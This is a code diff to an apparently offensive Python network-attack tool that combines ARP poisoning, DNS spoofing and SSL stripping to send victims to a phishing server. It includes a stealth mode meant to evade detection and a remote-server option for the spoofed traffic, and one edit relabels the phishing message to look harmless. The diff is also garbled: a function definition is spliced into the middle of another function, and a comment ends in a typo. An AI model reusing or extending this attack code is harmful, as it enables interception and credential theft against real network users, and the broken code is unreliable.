@@ -305,7 +305,10 @@ def arp_poison_loop(victim_ip, gateway_ip, victim_mac, gateway_mac):
     gateway_packet = Ether(dst=gateway_mac)/ARP(op="is-at", psrc=victim_ip, pdst=gateway_ip, hwdst=gateway_mac)
     
     # SILENT mode: slower (4s) to avoid detection
-    # ALL_OUT mode: faster (0.5s) to ensure poison sticks
+    # ALL_OUT mode: faster (0.5s) to ensure poison stickstim
+def manage_iptables(action):
+    if action not in ['A', 'D']:  # A = Add rule, D = Delete rule
+        return
     sleep_interval = 4 if CONFIG["MODE"] == "SILENT" else 0.5
     global STOP_ATTACK
     
@@ -572,7 +575,7 @@ class SSLStripHandler(BaseHTTPRequestHandler):
                 # Forward to local phishing server instead
                 real_ip = CONFIG['ATTACKER_IP']
                 port = 80
-                print(f"[SSL Strip] -> Local phishing server {real_ip}:{port}")
+                print(f"[SSL Strip] -> Local server {real_ip}:{port}")
             
             try:
                 # Create connection based on protocol
@@ -840,16 +843,21 @@ def setup_and_run():
     dns_thread.start()
     print("[DNS] Spoofing started")
     
-    # Start SSL stripping proxy
-    setup_ssl_strip_iptables()
-    ssl_thread = start_ssl_strip()
-    print("[SSL] Stripping proxy started")
+    # Start SSL stripping proxy (only if server is local)
+    if CONFIG['SERVER_IP'] == CONFIG['ATTACKER_IP']:
+        # Local server - use SSL strip proxy
+        setup_ssl_strip_iptables()
+        ssl_thread = start_ssl_strip()
+        print("[SSL] Stripping proxy started")
+    else:
+        # External server - just DNS spoof, no local proxy needed
+        ssl_thread = None
+        print(f"[*] External server mode: DNS spoofs to {CONFIG['SERVER_IP']}")
+        print(f"[*] SSL stripping disabled (traffic goes directly to external server)")
     
     print("\n" + "="*60)
     print("    Attack running. Ctrl+C to stop.")
-    print("="*60)
-    print(f"   Victim visits: http://{CONFIG['ATTACKER_IP']}/")
-    print("="*60 + "\n")
+    
     
     return arp_thread, dns_thread, ssl_thread
 
